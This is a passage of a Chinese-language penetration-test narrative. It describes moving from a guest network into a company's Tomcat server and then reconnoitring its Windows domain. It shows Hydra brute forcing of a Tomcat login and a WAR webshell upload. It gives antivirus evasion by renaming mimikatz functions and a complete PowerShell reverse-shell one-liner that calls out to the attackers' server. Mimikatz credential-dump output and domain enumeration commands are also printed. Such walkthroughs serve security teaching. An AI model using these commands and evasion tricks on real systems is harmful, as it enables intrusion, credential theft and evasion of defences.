    meterpreter> portfwd add -L 127.0.0.1 -l 8002 -r 192.168.178.195 -p 8080
80端口暴露了公司的电话簿，我们现在仍然不知道他们为什么在访客网络上暴露这些信息
快速扫描没有发现明显漏洞，于是我们决定检查下8080端口
我们遇到了Apache Tomcat的基本身份验证，使用Hydra进行爆破，几分钟后我们用admin/password123456登录了系统
现在我们进入了Tomcat管理控制台，这应该是防火墙配置的错误，因为不论是Tomcat管理控制台还是公司的号码簿，都不应该暴露在访客网路
我们计划在Tomcat上上传一个shell，以便能与底层操作系统进行交互。服务器指纹表明，我们正在对付的，是一台Windows服务器。
我们用Laudanum Injectable Web Exploit Code构造了war-archive，在管理页面上传了waf文件，其中包含了：
cmd.jsp：用于与cmd.exe进行交互
m.ps1：一个经过混淆和免杀的mimikatz.ps1，用于抓取密码和散列
由于其灵活性，混淆powershell脚本很容易，有几种著名的混淆技巧，我们只是改变了一些关键字，比如把Invoke-mimikatz改成Invoke-mymy什么的，还有一些其他的小技巧可供参考。
我们还在文件末尾添加了Invoke-mymy -dumpcreds，以便功能被直接执行
上传之后，我们就在浏览器访问了cmd.jsp
哈！用户是以SYSTEM权限运行服务的，我们继续进行信息收集。首先，来收集一下环境变量：
命令 cmd /c set
结果如下：
    ALLUSERSPROFILE=C:ProgramData
    COMPUTERNAME=SRVINTRANET
    USERDOMAIN=SUPERCOMPANY
    USERNAME=SRVINTRANET$
现在我们获取到了计算机名SRVINTRANET，与此同时，它属于SUPERCOMPANY域，完美。
继续使用systeminfo来检索其他有用信息：
命令：systeminfo
结果：
    Host Name: SRVINTRANET
    OS Name: Microsoft Windows Server 2012 R2 Standard
    OS Version: 6.3.9600 N/A Build 9600
    OS Manufacturer: Microsoft Corporation
    OS Configuration: Member Server
    OS Build Type: Multiprocessor Free
    Registered Owner: Windows User
    …
接下来是域控制器
命令：cmd /c nltest /dclist:supercompany
结果：
    Get a list of DCs in domain ‘supercompany’ from ‘\SRVDC1′.
    srvdc1.supercompany.local[PDC] [DS]Site: Default-First-Site-Name
    srvdc2.supercompany.local [DS]Site: Default-First-Site-Name
    The command completed successfully
这时候Android设备可能已经开始发热了，我们需要转移到一个更合适的shell上。Android设备已经不再适合我们的工作了。
我们的黄金法则是：保持隐蔽和躲避杀毒软件。于是我们使用了基于PowerShell的shell，希望SRVINTRANET能够访问互联网吧。
通过Tomcat上的webshell，我们装好了Powershell后门，将会执行单向回连的命令，与此同时我们的公网服务器用netcat监听了80端口
    cmd /c powershell -nop -c “$c=New-Object Net.Sockets.TCPClient(‘’,80); $s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb=(IEX $data 2>&1|Out-String);$sb2=$sb+’PS ‘+(pwd).Path+’>’; $sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);
    $s.Flush()};$c.Close()”
这个脚本有什么功能呢？它会在启动PowerShell的时候执行以下命令：创建一个TCPClient对象，反向连接到我们的机器，打开一个I/O流，并使用InvokeExpression来执行输入的内容
我们这次没那么幸运了，没有收到反向shell。这台服务器可能不能连接到互联网，于是我们又一次转向了Tomcat的webshell，并且安装了混淆过的mimikatz
    cmd /c powershell -executionpolicy bypass -f c:tomcatwebappscmdwarfilesm.ps1
    .#####. mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
    .## ^ ##. “A La Vie, A L’Amour”
    ## /  ## /* * *
    ##  / ## Benjamin DELPY `gentilkiwi` ( PI:EMAIL )
    ‘## v ##’ http://blog.gentilkiwi.com/mimikatz (oe.eo)
    ‘#####’ with 20 modules * * */
    mimikatz(powershell) # sekurlsa::logonpasswords
    Authentication Id : 0 ; 191734 (00000000:0002ecf6)
    Session : Interactive from 1
    User Name : Administrator
    Domain : SRVINTRANET
    Logon Server : SRVINTRANET
    Logon Time : 2/17/2017 2:12:31 PM
    SID : S-1-5-21-938204560-2839928776-2225904511-500
    msv :
    [00010000] CredentialKeys
    * NTLM : 604603ab105adc8XXXXXXXXXXXXXXXXX
        * SHA1 : 7754ff505598bf3XXXXXXXXXXXXXXXXXXXXXXXXX
    [00000003] Primary
    * Username : Administrator
    * Domain : SRVINTRANET
    * NTLM : 604603ab105adc8XXXXXXXXXXXXXXXXX
        * SHA1 : 7754ff505598bf3XXXXXXXXXXXXXXXXXXXXXXXXX
    tspkg :
    wdigest :
    * Username : Administrator
    * Domain : SRVINTRANET
    * Password : (null)
    kerberos :
    * Username : Administrator
    * Domain : SRVINTRANET
    * Password : (null)
    ssp :    KO
    credman :
    mimikatz(powershell) # exit
    Bye!
我们得到了本地管理员的密码哈希，但是没有明文。这是因为我们的目标服务器是Windows Server
2012，而在2008以后，事情发生了变化，WDigest凭证就不再储存明文了（不禁怀念过去的美好时光），此外credman是空的。总之这次发现也不差吧。
我们决定找到一个能够访问互联网的服务器，因为我们现在依然在借助一个连接不稳定的安卓手机完成渗透工作。
通过net view命令，我们得到了可用的共享服务器列表
    Server Name Remark
    ————————————————-    \SRVDC1 Domain controller PDC
    \SRVDC2 [4] Domain Controller
    \SRVWSUS Server WSUS
    \SRVAV Server AV
    \SRVFILE1 File Server
这就是真正的服务器网络